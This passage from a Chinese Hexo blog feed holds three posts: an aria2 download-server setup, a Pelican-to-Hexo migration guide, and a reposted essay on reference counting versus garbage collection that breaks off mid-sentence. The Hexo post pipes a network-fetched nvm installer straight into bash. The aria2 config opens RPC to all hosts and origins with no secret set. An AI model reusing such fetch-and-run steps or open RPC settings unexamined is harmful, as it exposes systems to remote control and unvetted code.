        <content type="html"><![CDATA[<p>Aria2 是一款轻量级的命令行下载工具，支持 HTTP/HTTPS、FTP、SFTP、BitTorrent 和 Metalink 等链接格式，提供 JSON-RPC 和 XML-RPC 管理接口，是一款优秀的 Linux 版迅雷替代品。</p><a id="more"></a><h2 id="Aria2-Server"><a href="#Aria2-Server" class="headerlink" title="Aria2 Server"></a>Aria2 Server</h2><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/aria2</span><br><span class="line">touch /etc/aria2/save-session.list</span><br><span class="line"></span><br><span class="line">mkdir /var/log/aria2</span><br></pre></td></tr></table></figure><p>将以下内容保存至 <code>/etc/aria2/aria2.conf</code>：</p><figure class="highlight ini hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">## '#'开头为注释内容, 选项都有相应的注释说明, 根据需要修改 ##</span></span><br><span class="line"><span class="hljs-comment">## 被注释的选项填写的是默认值, 建议在需要修改时再取消注释  ##</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">## 文件保存相关 ##</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 文件的保存路径(可使用绝对路径或相对路径), 默认: 当前启动位置</span></span><br><span class="line"><span class="hljs-attr">dir</span>=/home/whypro/aria2</span><br><span class="line"><span class="hljs-comment"># 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M</span></span><br><span class="line"><span class="hljs-comment">#disk-cache=32M</span></span><br><span class="line"><span class="hljs-comment"># 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc</span></span><br><span class="line"><span class="hljs-comment"># 预分配所需时间: none &lt; falloc ? trunc &lt; prealloc</span></span><br><span class="line"><span class="hljs-comment"># falloc和trunc则需要文件系统和内核支持</span></span><br><span class="line"><span class="hljs-comment"># NTFS建议使用falloc, EXT3/4建议trunc, MAC 下需要注释此项</span></span><br><span class="line"><span class="hljs-comment">#file-allocation=none</span></span><br><span class="line"><span class="hljs-comment"># 断点续传</span></span><br><span class="line"><span class="hljs-attr">continue</span>=<span class="hljs-literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">## 下载连接相关 ##</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 最大同时下载任务数, 运行时可修改, 默认:5</span></span><br><span class="line"><span class="hljs-comment">#max-concurrent-downloads=5</span></span><br><span class="line"><span class="hljs-comment"># 同一服务器连接数, 添加时可指定, 默认:1</span></span><br><span class="line"><span class="hljs-attr">max-connection-per-server</span>=<span class="hljs-number">10</span></span><br><span class="line"><span class="hljs-comment"># 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M</span></span><br><span class="line"><span class="hljs-comment"># 假定size=10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载</span></span><br><span class="line"><span class="hljs-attr">min-split-size</span>=<span class="hljs-number">10</span>M</span><br><span class="line"><span class="hljs-comment"># 单个任务最大线程数, 添加时可指定, 默认:5</span></span><br><span class="line"><span class="hljs-comment">#split=5</span></span><br><span class="line"><span class="hljs-comment"># 整体下载速度限制, 运行时可修改, 默认:0</span></span><br><span class="line"><span class="hljs-comment">#max-overall-download-limit=0</span></span><br><span class="line"><span class="hljs-comment"># 单个任务下载速度限制, 默认:0</span></span><br><span class="line"><span class="hljs-comment">#max-download-limit=0</span></span><br><span class="line"><span class="hljs-comment"># 整体上传速度限制, 运行时可修改, 默认:0</span></span><br><span class="line"><span class="hljs-comment">#max-overall-upload-limit=0</span></span><br><span class="line"><span class="hljs-comment"># 单个任务上传速度限制, 默认:0</span></span><br><span class="line"><span class="hljs-comment">#max-upload-limit=0</span></span><br><span class="line"><span class="hljs-comment"># 禁用IPv6, 默认:false</span></span><br><span class="line"><span class="hljs-attr">disable-ipv6</span>=<span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-comment"># 连接超时时间, 默认:60</span></span><br><span class="line"><span class="hljs-attr">timeout</span>=<span class="hljs-number">600</span></span><br><span class="line"><span class="hljs-comment"># 最大重试次数, 设置为0表示不限制重试次数, 默认:5</span></span><br><span class="line"><span class="hljs-attr">max-tries</span>=<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-comment"># 设置重试等待的秒数, 默认:0</span></span><br><span class="line"><span class="hljs-attr">retry-wait</span>=<span class="hljs-number">30</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">## 进度保存相关 ##</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 从会话文件中读取下载任务</span></span><br><span class="line"><span class="hljs-attr">input-file</span>=/etc/aria2/save-session.list</span><br><span class="line"><span class="hljs-comment"># 在Aria2退出时保存`错误/未完成`的下载任务到会话文件</span></span><br><span class="line"><span class="hljs-attr">save-session</span>=/etc/aria2/save-session.list</span><br><span class="line"><span class="hljs-comment"># 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0</span></span><br><span class="line"><span class="hljs-comment">#save-session-interval=60</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">## RPC相关设置 ##</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 启用RPC, 默认:false</span></span><br><span class="line"><span class="hljs-attr">enable-rpc</span>=<span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-comment"># 允许所有来源, 默认:false</span></span><br><span class="line"><span class="hljs-attr">rpc-allow-origin-all</span>=<span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-comment"># 允许非外部访问, 默认:false</span></span><br><span class="line"><span class="hljs-attr">rpc-listen-all</span>=<span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-comment"># 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同</span></span><br><span class="line"><span class="hljs-comment">#event-poll=select</span></span><br><span class="line"><span class="hljs-comment"># RPC监听端口, 端口被占用时可以修改, 默认:6800</span></span><br><span class="line"><span class="hljs-comment">#rpc-listen-port=6800</span></span><br><span class="line"><span class="hljs-comment"># 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项</span></span><br><span class="line"><span class="hljs-comment">#rpc-secret=&lt;TOKEN&gt;</span></span><br><span class="line"><span class="hljs-comment"># 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项</span></span><br><span class="line"><span class="hljs-comment">#rpc-user=&lt;USER&gt;</span></span><br><span class="line"><span class="hljs-comment"># 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项</span></span><br><span class="line"><span class="hljs-comment">#rpc-passwd=&lt;PASSWD&gt;</span></span><br><span class="line"><span class="hljs-comment"># 是否启用 RPC 服务的 SSL/TLS 加密,</span></span><br><span class="line"><span class="hljs-comment"># 启用加密后 RPC 服务需要使用 https 或者 wss 协议连接</span></span><br><span class="line"><span class="hljs-comment">#rpc-secure=true</span></span><br><span class="line"><span class="hljs-comment"># 在 RPC 服务中启用 SSL/TLS 加密时的证书文件,</span></span><br><span class="line"><span class="hljs-comment"># 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥</span></span><br><span class="line"><span class="hljs-comment">#rpc-certificate=/path/to/certificate.pem</span></span><br><span class="line"><span class="hljs-comment"># 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件</span></span><br><span class="line"><span class="hljs-comment">#rpc-private-key=/path/to/certificate.key</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">## BT/PT下载相关 ##</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:true</span></span><br><span class="line"><span class="hljs-comment">#follow-torrent=true</span></span><br><span class="line"><span class="hljs-comment"># BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999</span></span><br><span class="line"><span class="hljs-attr">listen-port</span>=<span class="hljs-number">51413</span></span><br><span class="line"><span class="hljs-comment"># 单个种子最大连接数, 默认:55</span></span><br><span class="line"><span class="hljs-comment">#bt-max-peers=55</span></span><br><span class="line"><span class="hljs-comment"># 打开DHT功能, PT需要禁用, 默认:true</span></span><br><span class="line"><span class="hljs-attr">enable-dht</span>=<span class="hljs-literal">false</span></span><br><span class="line"><span class="hljs-comment"># 打开IPv6 DHT功能, PT需要禁用</span></span><br><span class="line"><span class="hljs-comment">#enable-dht6=false</span></span><br><span class="line"><span class="hljs-comment"># DHT网络监听端口, 默认:6881-6999</span></span><br><span class="line"><span class="hljs-comment">#dht-listen-port=6881-6999</span></span><br><span class="line"><span class="hljs-comment"># 本地节点查找, PT需要禁用, 默认:false</span></span><br><span class="line"><span class="hljs-comment">#bt-enable-lpd=false</span></span><br><span class="line"><span class="hljs-comment"># 种子交换, PT需要禁用, 默认:true</span></span><br><span class="line"><span class="hljs-attr">enable-peer-exchange</span>=<span class="hljs-literal">false</span></span><br><span class="line"><span class="hljs-comment"># 每个种子限速, 对少种的PT很有用, 默认:50K</span></span><br><span class="line"><span class="hljs-comment">#bt-request-peer-speed-limit=50K</span></span><br><span class="line"><span class="hljs-comment"># 客户端伪装, PT需要</span></span><br><span class="line"><span class="hljs-attr">peer-id-prefix</span>=-TR2770-</span><br><span class="line"><span class="hljs-attr">user-agent</span>=Transmission/<span class="hljs-number">2.77</span></span><br><span class="line"><span class="hljs-comment"># 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0</span></span><br><span class="line"><span class="hljs-attr">seed-ratio</span>=<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-comment"># 强制保存会话, 即使任务已经完成, 默认:false</span></span><br><span class="line"><span class="hljs-comment"># 较新的版本开启后会在任务完成后依然保留.aria2文件</span></span><br><span class="line"><span class="hljs-comment">#force-save=false</span></span><br><span class="line"><span class="hljs-comment"># BT校验相关, 默认:true</span></span><br><span class="line"><span class="hljs-comment">#bt-hash-check-seed=true</span></span><br><span class="line"><span class="hljs-comment"># 继续之前的BT任务时, 无需再次校验, 默认:false</span></span><br><span class="line"><span class="hljs-attr">bt-seed-unverified</span>=<span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-comment"># 保存磁力链接元数据为种子文件(.torrent文件), 默认:false</span></span><br><span class="line"><span class="hljs-attr">bt-save-metadata</span>=<span class="hljs-literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">## 其他相关 ##</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 日志级别，可以为debug, info, notice, warn 或 error</span></span><br><span class="line"><span class="hljs-attr">log-level</span>=notice</span><br><span class="line"><span class="hljs-comment"># 日志文件，根据实际情况修改</span></span><br><span class="line"><span class="hljs-attr">log</span>=/var/log/aria2/aria2.log</span><br><span class="line"><span class="hljs-comment"># 下载进度输出的间隔时间</span></span><br><span class="line"><span class="hljs-attr">summary-interval</span>=<span class="hljs-number">120</span></span><br><span class="line"><span class="hljs-comment"># 是否以守护进程的方式启动</span></span><br><span class="line"><span class="hljs-attr">daemon</span>=<span class="hljs-literal">true</span></span><br></pre></td></tr></table></figure><h2 id="Systemd-Service"><a href="#Systemd-Service" class="headerlink" title="Systemd Service"></a>Systemd Service</h2><p>将以下内容保存至 <code>aria2c.service</code> 放入 <code>/lib/systemd/system/</code> 目录</p><figure class="highlight ini hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-section">[Unit]</span></span><br><span class="line"><span class="hljs-attr">Description</span>=aria2c -- file download manager</span><br><span class="line"><span class="hljs-attr">After</span>=network.target</span><br><span class="line"></span><br><span class="line"><span class="hljs-section">[Service]</span></span><br><span class="line"><span class="hljs-attr">Type</span>=forking</span><br><span class="line"><span class="hljs-attr">User</span>=%i</span><br><span class="line"><span class="hljs-attr">WorkingDirectory</span>=%h</span><br><span class="line"><span class="hljs-attr">Environment</span>=VAR=/var/%i</span><br><span class="line"><span class="hljs-attr">ExecStart</span>=/usr/bin/aria2c --conf-path=/etc/aria2/aria2.conf</span><br><span class="line"></span><br><span class="line"><span class="hljs-section">[Install]</span></span><br><span class="line"><span class="hljs-attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure><p>之后执行</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl start aria2c</span><br><span class="line">systemctl enable aria2c</span><br></pre></td></tr></table></figure><h2 id="Web-UI"><a href="#Web-UI" class="headerlink" title="Web UI"></a>Web UI</h2><h3 id="Aria2WebUI"><a href="#Aria2WebUI" class="headerlink" title="Aria2WebUI"></a>Aria2WebUI</h3><ul><li><a href="http://webui-aria2.ghostry.cn/" target="_blank" rel="noopener">http://webui-aria2.ghostry.cn/</a></li><li><a href="https://ziahamza.github.io/webui-aria2/" target="_blank" rel="noopener">https://ziahamza.github.io/webui-aria2/</a></li></ul><h3 id="YAAW"><a href="#YAAW" class="headerlink" title="YAAW:"></a>YAAW:</h3><ul><li><a href="https://chrome.google.com/webstore/detail/yaaw-for-chrome/dennnbdlpgjgbcjfgaohdahloollfgoc" target="_blank" rel="noopener">Chrome 插件</a></li></ul><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] <a href="http://ju.outofmemory.cn/entry/146734" target="_blank" rel="noopener">Raspberry Pi技术笔记之四：使用aria2打造下载利器</a><br>[2] <a href="http://aria2c.com/usage.html" target="_blank" rel="noopener">Aria2 &amp; YAAW 使用说明</a><br>[3] <a href="https://aria2.github.io/manual/en/html/aria2c.html" target="_blank" rel="noopener">aria2c docs</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello, Hexo.</title>
      <link href="/hexo-blog/20170924/hello-hexo/"/>
      <url>/hexo-blog/20170924/hello-hexo/</url>
      
        <content type="html"><![CDATA[<p>周末折腾了半天，终于将博客从 Pelican 转到了 Hexo，在此记录一下。</p><h2 id="方案选择"><a href="#方案选择" class="headerlink" title="方案选择"></a>方案选择</h2><p>首先说说方案选择，目前博客系统大致分为静态和动态两类，动态博客有 Wordpress、Ghost 等等，因为需要单独的主机和搭建环境，并且数据存在 DB 迁移起来比较费劲，所以放弃了这种方案；静态博客有 Pelican、Jekyll、Hexo 等等，后者很多优点，访问速度快，博客可直接用 Markdown 以文件的形式保存在 Github，借助 Github Pages 部署方便，不用自己搭建主机，总之个人觉得这些优点可以完爆动态博客。</p><p>笔者之前的博客是基于 Pelican 的，因为使用 Python 写的，而自己对 Python 有一种痴迷，因此之前选用了这种方案，但是慢慢发现缺点有很多。首先是渲染速度慢，当文章越来越多时，博客生成的时间就会让人难以忍受。另外 Pelican 的主题都不是很炫，找了半天都没有找到好看的主题，这也是促使我选用其他博客系统的一个原因。</p><p>其次了解了 Jekyll，它是用 Ruby 开发的，也是 Github 主推的博客系统，和 Github 无缝结合，可以直接在 Github 页面上配置、修改主题（<a href="https://pages.github.com/" target="_blank" rel="noopener">教程在此</a>），主题也很多，如果没有遇见 Hexo，也许我会选择 Jekyll。</p><p>Hexo 使用 Nodejs 开发，渲染速度相对于 Python 和 Ruby 来说很快，而且 CLI 设计也非常人性化，配置简单，支持的插件也有很多，使用 <code>npm</code> 来管理。也许正是由于开发语言的关系，Hexo 的主题质量都非常高，都非常好看，让人眼花缭乱（<a href="https://hexo.io/themes/index.html" target="_blank" rel="noopener">https://hexo.io/themes/index.html</a>）。老实说我是被这款名叫 <a href="https://github.com/klugjo/hexo-theme-alpha-dust" target="_blank" rel="noopener">AlphaDust</a> 的主题吸引了，非常有科技感，而且响应式在移动设备上也比较完美，无论是英文字体还是中文字体都支持很好，对作者的敬意油然而生。当然 <a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT</a> 也是一款非常优秀的主题，以后有机会可以尝试一下（^_^）。</p><a id="more"></a><h2 id="安装和配置"><a href="#安装和配置" class="headerlink" title="安装和配置"></a>安装和配置</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>可以参考<a href="https://hexo.io/docs/index.html" target="_blank" rel="noopener">官方文档</a>。</p><p>首先安装 nvm：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.2/install.sh | bash</span></span><br></pre></td></tr></table></figure><p>安装完成后重启终端，安装 nodejs 和 hexo：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> nvm install stable</span></span><br><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> npm install -g hexo-cli</span></span><br></pre></td></tr></table></figure><p>创建一个新的博客项目：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> hexo init &lt;folder&gt;</span></span><br><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> <span class="hljs-built_in">cd</span> &lt;folder&gt;</span></span><br><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> npm install</span></span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>这里要注意的是如果使用 Github Pages，URL 包含子目录时，要注意设置 <code>_config.yml</code> 中的 <code>url</code> 和 <code>root</code>。</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">url:</span> <span class="hljs-attr">http://whypro.github.io/hexo-blog</span></span><br><span class="line"><span class="hljs-attr">root:</span> <span class="hljs-string">/hexo-blog/</span></span><br></pre></td></tr></table></figure><p>文章 URL 和文件名的配置按照个人喜好来修改：</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">permalink:</span> <span class="hljs-string">:year:month:day/:title/</span></span><br><span class="line"><span class="hljs-attr">new_post_name:</span> <span class="hljs-string">:year:month:day-:title.md</span></span><br></pre></td></tr></table></figure><h2 id="部署-Github-Pages"><a href="#部署-Github-Pages" class="headerlink" title="部署 Github Pages"></a>部署 Github Pages</h2><p>首先在配置文件中加入 Github 相关信息：</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">deploy:</span>  </span><br><span class="line"><span class="hljs-attr">  type:</span> <span class="hljs-string">git</span></span><br><span class="line"><span class="hljs-attr">  repository:</span> <span class="hljs-string">git@github.com:&lt;username&gt;/&lt;reponame&gt;.git</span></span><br><span class="line"><span class="hljs-attr">  branch:</span> <span class="hljs-string">gh-pages</span></span><br></pre></td></tr></table></figure><p>然后执行：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> hexo generate</span></span><br><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> hexo deploy</span></span><br></pre></td></tr></table></figure><h2 id="后续工作"><a href="#后续工作" class="headerlink" title="后续工作"></a>后续工作</h2><p>至于博客的全文搜索，可以用 <a href="https://swiftype.com/" target="_blank" rel="noopener">Swiftype</a> 服务，有空再研究一下。</p><p>关于代码高亮可以参考 <a href="http://highlightjs.readthedocs.io/en/latest/css-classes-reference.html" target="_blank" rel="noopener">CSS classes reference</a>。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] <a href="https://www.race604.com/migrate-ghost-to-hexo/" target="_blank" rel="noopener">博客从 Ghost 迁移到 Hexo</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>引用计数与垃圾收集之比较</title>
      <link href="/hexo-blog/20160910/%E5%BC%95%E7%94%A8%E8%AE%A1%E6%95%B0%E4%B8%8E%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E4%B9%8B%E6%AF%94%E8%BE%83/"/>
      <url>/hexo-blog/20160910/%E5%BC%95%E7%94%A8%E8%AE%A1%E6%95%B0%E4%B8%8E%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E4%B9%8B%E6%AF%94%E8%BE%83/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文地址：<a href="http://blog.codingnow.com/2008/06/gc.html" target="_blank" rel="noopener">http://blog.codingnow.com/2008/06/gc.html</a></p></blockquote><p>本质上来说，引用计数策略和垃圾收集策略都属于资源的自动化管理。所谓自动化管理，就是在逻辑层不知道资源在什么时候被释放掉，而依赖底层库来维持资源的生命期。</p><p>而手工管理，则是可以准确的知道资源的生命期，在准确的位置回收它。在 C++ 中，体现在析构函数中写明 delete 用到的资源，并由编译器自动生成的代码析构基类和成员变量。</p><p>所以，为 C++ 写一个垃圾收集器，并不和手工管理资源冲突。自动化管理几乎在所有有点规模的 C++ 工程中都在使用，只不过用的是引用计数的策略而非垃圾收集而已。也就是说，我们使用 C++ 或 C 长期以来就是结合了手工管理和自动管理在构建系统了。无论用引用计数，还是用垃圾收集，软件实现的细节上，该手工管理的地方我们依旧可以手工管理。</p><p>为什么要用资源生命期自动管理？</p><a id="more"></a><p>让我们来看面向对象，如果一切皆对象，每个对象的生命期就应该由自己负责，我们是可以直接准确的死亡时间的。可惜，有很多东西不是纯粹的对象。最重要的一个就是对象容器。它们除了自身的属性，还保持了对一组同类对象的引用。</p><p>一个对象可以分别被几个容器引用，这使得容器区别于猫猫狗狗这些对象实体。因为容器引用一个东西不等于这个东西是这个容器的一部分（有时候可以，有时候不行）。当我们把希望整个世界分成一个个对象时，所有的原子被分到各层的对象上后，就会发现有零零总总的概念无法用对象提取。引用而非拥有，这是无法回避的。</p><p>面向对象的本质在于，对许多对象提取出共性放在一起处理。这样，各式容器的使用就是无可避免的了。</p><p>也正是如此，对象自己并不知道自己是否已经可以宣告死亡。除非了解自己和别的对象的联系（这种关系不是对象）。资源可以是对象，而自动化管理正是管理的这些对象和对象之间的关系。</p><p>引用计数就是最容易实现的一种方案：记录对象被引用的次数，而不具体记录是谁引用了它。这样，降低了建立和解除引用的代价。但是，有得必有失。在引用计数的过程中，我们也丢失了重要的信息：到底是谁引用了自己。所以，引用计数在处理间接引用的问题上代价增加。</p><p>对象死亡的判定是：对象和这个世界还有没有联系，无论是直接的还是间接的。所以，一个对象即使还有另外的对象直接引用它，它也可能已经脱离了世界。为了解决这个问题，使用引用计数的系统，必须在对象和世界脱离联系时，通知和它有关联的对象。对象的销毁代价增加，就是引用计数策略的短板。</p><p>对象的销毁频率，取决于对象的平均生存时间。而对象的生存时间，一方面受对象粒度的影响，往往对象粒度越细，对象平均生存时间越短（虽然表面上没有直接联系，但是实际设计时往往会导致这个结果）；另一方面，我们往往会把容器和引用关系也实现成一种对象（概念上本不应该是对象）。比如说许多自动维持引用计数的智能指针就是一个小容器，里面保持了对一个对象唯一的引用，它就被实现成一个小对象。</p><p>通常，对象本身的性质并不随自己在内存空间中的位置改变而改变。但是引用关系（通常用指针来实现）却和内存地址相关。C++ 缺乏一种对象在内存中移动的语义表达，等价物是，在新的内存块中拷贝构造一个新对象，并销毁原有的。</p><p>另一方面，程序的运行序中，函数调用造成的堆栈上的嵌套作用域也可以看成一个个容器，机器指令穿行于这些作用域间，临时构造出的对对象的引用（智能指针），就被放置于这些作用域内。函数调用越频繁，这些作用域的创建和销毁也就越频繁。</p><p>这些导致了 C++ 必须依赖大量的 inline 函数，让编译器了解更多的上下文信息，方能减轻小对象（智能指针）创建销毁的负担。 STL 库也必须为其做一些优化，例如 stl port 中，对 POD 类型就做了特例化处理。可惜，智能指针不是 POD ，让编译器聪明到合并执行序列中的引用加减，难度太大（考虑到多线程因素，除非编译器可以知道线程的信息，否则几乎不可能实现）。</p><p>C++ 在实现面向对象的编程上，比 C 提供了许多便利。其中之一就是，在描述一个对象是另一个对象的一部分时，通过构造和析构函数机制，可以自动化的维护这相关部分的生命期。但它没能在语言上解决的是，当两者之间只是引用关系时，生命期如何处理。前者，我们有几乎唯一的简洁明了的解决之道；而后者根据实际需要可以有多种选择，顾而 C++ 在语言层面不提供一致解决方案。可惜的是 C++ 却一直每能提供一个简洁好用，带有普适性的 GC 库。大家都偏向于更为容易实现的引用计数的方案，这个结果跟具体实现的复杂度有关。毕竟在实现 gc 的时候，C 缺乏必要的语言支持（而 C++ 在实现层面，是从 C 的基础上发展而来）。</p><hr><p>再来看看垃圾收集，比较成熟的算法基于标记清除（或标记整理）或其变体。简单说，就是由收集器框架记录下对象和对象之间的联系（这些联系信息存放的位置不重要，可以在对象的内存布局空间上，也可以在独立的地方，关键在于这些信息可以被收集器访问）。确定一个世界的根，定期的从这个根开始遍历这个世界，把有关联的对象标记起来，最后回收没有被标记的对象。</p><p>从算法上来看，建立对象和对象之间的联系的时间代价和引用计数的时间代价数量级上是一致的，都是 O(1) 。但实际实现时，前者的代价通常要大一些。空间代价上也是前者略大，但也没有数量级上的差别。</p><p>而 GC 管理的对象，在销毁时的代价要小的多。它不需要通知和它有关联的对象。</p><p>这就是为什么，许多使用 GC 的软件有时候比使用引用计数的软件运行效率还高那么一点的缘故。</p><p>可是，GC 有一个额外的时间代价来源于标记的过程。完成完整的一次清理过程，必然遍历到世界中每一个活着的对象。代价是 O(N) ，N 随着对象总体数量的增加而增加。所以我们应该减少被 GC 管理的对象的数量，在这一点上，手工管理依然有意义。即，明确一个对象是另一个对象的组成部分时，可以考虑用手工管理的方式。</p><p>另一个糟糕的地方是，在实现时，我们往往把对象间的关联信息放在了对象本身的内存布局空间中，遍历这个世界中的对象意味着访问所有对象的内存。当虚拟内存空间大于实际物理内存空间时，这意味着页面交换。我觉得，很大程度上，java 或 C# 这样的语言搭建起来的庞大系统偶尔运行缓慢，根本原因就在这里。当然，这些是可以被改进的。并非算法本身的问题。</p><p>可以这样说，GC (garbage collection) 把 RC (reference counting) 